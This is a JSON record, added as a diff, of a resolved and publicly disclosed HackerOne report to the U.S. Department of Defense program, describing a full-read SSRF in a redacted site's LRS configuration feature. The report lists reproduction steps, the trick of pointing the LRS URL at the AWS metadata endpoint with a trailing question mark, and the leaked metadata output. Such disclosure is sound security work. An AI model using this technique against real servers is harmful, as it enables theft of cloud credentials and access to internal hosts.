@@ -1,0 +1,211 @@
+{
+  "id": 1628102,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjI4MTAy",
+  "url": "https://hackerone.com/reports/1628102",
+  "title": "Full read SSRF at █████████ [HtUS]",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2022-07-06T14:16:13.747Z",
+  "submitted_at": "2022-07-06T14:16:13.838Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "sudi",
+    "url": "/sudi",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/h54zoekbmc0kqlq42xu2vqj6ge13/47c72a82657a929c13ab24e11674f7e10ea2bf67b1b9e7116b522cd7ede42f15"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16064,
+    "url": "https://hackerone.com/deptofdefense",
+    "handle": "deptofdefense",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "U.S. Dept Of Defense",
+      "twitter_handle": "DC3VDP",
+      "website": "https://bit.ly/3ntULtN",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": true,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-09-14T20:52:39.213Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-08-16T11:57:06.883Z",
+  "team_member_agreed_on_going_public_at": "2022-09-14T20:52:39.035Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Heyy there,\nWe have found a full read ssrf vuln in https://█████ , we were able to hit the AWS Metadata endpoint (http://███████) though the SSRF Vuln.\n\n\n------------\n\n**Steps to reproduce:**\n\n1.Goto https://██████/users/create and create an account\n2.After you account is verified , get login\nIf for some reasons you are not the verification code, try with a gmail id\n\n3.Now visit: https://████/products/create/   and fill the required details\n4.Once your product is created, click on `New Configuration` which is under *LRS Configurations*\n\n████████\n\n5.Enter this as the input for * LRS URL *: `http://█████████/latest/meta-data?` (the question mark at the end is important)\n6.Under *Basic Auth User & Pass* enter test for both fields and click on `Create new LRS configuration` \n\n█████\n\n7.Once the `Configuration` is created click on the `Test` button beside the conifguration name\n████\n8.Now you will be redirected to the homepage, so go back to the product page\n9.Under `Past Results` you should be able to see a new entry\n10.Click on `Manage Test record` > `Download log`\n11.Now check the `Include HTTP` checkbox and from the `Log Format` drop down menu choose *Plain text*\n\nA file with the name `log` should be downloaded in your computer, just open it and there you will find the response from the aws meta data endpoint:\n\n```\n\n\"\"\nfailed\n\"SyntaxError: Unexpected token a in JSON at position 0\"\nREQUEST SUPERREQUEST\n_______________________________________\nPOST /latest/meta-data?/statements HTTP/1.1\nX-Experience-API-Version: 1.0.3\nAuthorization: Basic dGVzdDp0ZXN0\nhost: ██████████\naccept: application/json\ncontent-type: application/json\ncontent-length: 324\nConnection: close\n\n{\"actor\":{\"objectType\":\"Agent\",\"name\":\"xAPI mbox\",\"mbox\":\"mailto:████\"},\"verb\":{\"id\":\"http://███\",\"display\":{\"en-GB\":\"attended\",\"en-US\":\"attended\"}},\"object\":{\"objectType\":\"Activity\",\"id\":\"http://www.example.com/meetings/occurances/34534\"},\"id\":\"3b9e4565-07ac-475f-be1f-d5f590f40779\"}\n\nRESPONSE SUPERREQUEST\n_______________________________________\nHTTP/1.0 200 OK\naccept-ranges: bytes\ncontent-length: 326\ncontent-type: text/plain\ndate: Wed, 06 Jul 2022 13:48:12 GMT\nlast-modified: Thu, 30 Jun 2022 09:37:12 GMT\nconnection: close\nserver: EC2ws\n\nami-id\nami-launch-index\nami-manifest-path\nblock-device-mapping/\nevents/\nhibernation/\nhostname\nidentity-credentials/\ninstance-action\ninstance-id\ninstance-life-cycle\ninstance-type\nlocal-hostname\nlocal-ipv4\nmac\nmetrics/\nnetwork/\nplacement/\nprofile\npublic-hostname\npublic-ipv4\npublic-keys/\nreservation-id\nsecurity-groups\nservices/\n=======================================\nREQUEST SUPERREQUEST\n_______________________________________\nGET /latest/meta-data?/statements?statementId=3b9e4565-07ac-475f-be1f-d5f590f40779 HTTP/1.1\nX-Experience-API-Version: 1.0.3\nAuthorization: Basic dGVzdDp0ZXN0\nhost: ██████\nConnection: close\n\nRESPONSE SUPERREQUEST\n_______________________________________\nHTTP/1.0 200 OK\naccept-ranges: bytes\ncontent-length: 326\ncontent-type: text/plain\ndate: Wed, 06 Jul 2022 13:48:12 GMT\nlast-modified: Thu, 30 Jun 2022 09:37:12 GMT\nconnection: close\nserver: EC2ws\n\nami-id\nami-launch-index\nami-manifest-path\nblock-device-mapping/\nevents/\nhibernation/\nhostname\nidentity-credentials/\ninstance-action\ninstance-id\ninstance-life-cycle\ninstance-type\nlocal-hostname\nlocal-ipv4\nmac\nmetrics/\nnetwork/\nplacement/\nprofile\npublic-hostname\npublic-ipv4\npublic-keys/\nreservation-id\nsecurity-groups\nservices/\n=======================================\n\n```\n\n## Impact\n\nAn attacker can dump aws keys  , reach internal hosts and etc\n\n\nThankyou\nRegards\nheint and sudi",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 11,
+  "voters": [
+    "loaymorad",
+    "jensec",
+    "zy9ard3",
+    "red_darkin",
+    "sa1tama0",
+    "shivammusic",
+    "benjamn",
+    "destinedtohack",
+    "qweasdzxcvbn",
+    "norwegianguy",
+    "and 1 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.7,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "1628102",
+  "votes": 11,
+  "latest_disclosable_activity_at": "2022-09-14T20:52:39.270Z",
+  "_metadata": {
+    "saved_at": "2026-07-03T13:06:53.116751",
+    "source": "https://hackerone.com/reports/1628102.json",
+    "report_id": 1628102
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjI4MTAy",
+    "databaseId": "1628102",
+    "title": "Full read SSRF at █████████ [HtUS]",
+    "url": "https://hackerone.com/reports/1628102",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2022-09-14T20:52:39.213Z",
+    "created_at": "2022-07-06T14:16:13.747Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzY4",
+      "name": "Server-Side Request Forgery (SSRF)",
+      "external_id": "cwe-918"
+    },
+    "severity": {
+      "rating": "high",
+      "score": 7.7
+    },
+    "reporter": {
+      "username": "sudi"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpWdWxuZXJhYmlsaXR5RGlzY2xvc3VyZVByb2dyYW0vMTYwNjQ=",
+      "handle": "deptofdefense",
+      "name": "U.S. Dept Of Defense",
+      "url": "https://hackerone.com/deptofdefense",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS80MDU3ODM=",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2022-07-07T15:13:27.802Z"
+          }
+        },
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS80MDU3ODQ=",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2022-07-07T15:13:28.019Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzE2MjgxMDI=",
+    "_id": "1628102",
+    "disclosed": true,
+    "votes": 11,
+    "latest_disclosable_activity_at": "2022-09-14T20:52:39.270Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjI4MTAy",
+      "databaseId": "1628102",
+      "title": "Full read SSRF at █████████ [HtUS]",
+      "url": "https://hackerone.com/reports/1628102",
+      "disclosed_at": "2022-09-14T20:52:39.213Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpWdWxuZXJhYmlsaXR5RGlzY2xvc3VyZVByb2dyYW0vMTYwNjQ=",
+      "handle": "deptofdefense",
+      "name": "U.S. Dept Of Defense",
+      "url": "https://hackerone.com/deptofdefense",
+      "currency": "usd"
+    }
+  }
+}
